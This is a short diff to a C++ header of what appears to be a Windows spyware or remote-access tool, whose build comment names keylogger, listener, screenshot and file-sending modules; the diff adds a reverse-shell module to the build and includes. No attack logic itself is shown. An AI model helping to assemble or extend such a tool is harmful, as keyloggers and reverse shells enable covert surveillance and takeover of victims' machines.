@@ -1,7 +1,7 @@
 #ifndef HEADER_LINKING
 #define HEADER_LINKING
 
-// Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp web/*.cpp screenshots/*.cpp -lwinmm -lws2_32 -lgdi32
+// Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp web/*.cpp screenshots/*.cpp reverseShell/*.cpp -lwinmm -lws2_32 -lgdi32
 
 #include <iostream>
 #include <fstream>
@@ -26,5 +26,6 @@ extern std::atomic<std::string *>filesToPostSend;
 #include "threads.hpp"
 #include "serverComs.hpp"
 #include "screenshot.hpp"
+#include "reverseShell.hpp"
 
 #endif
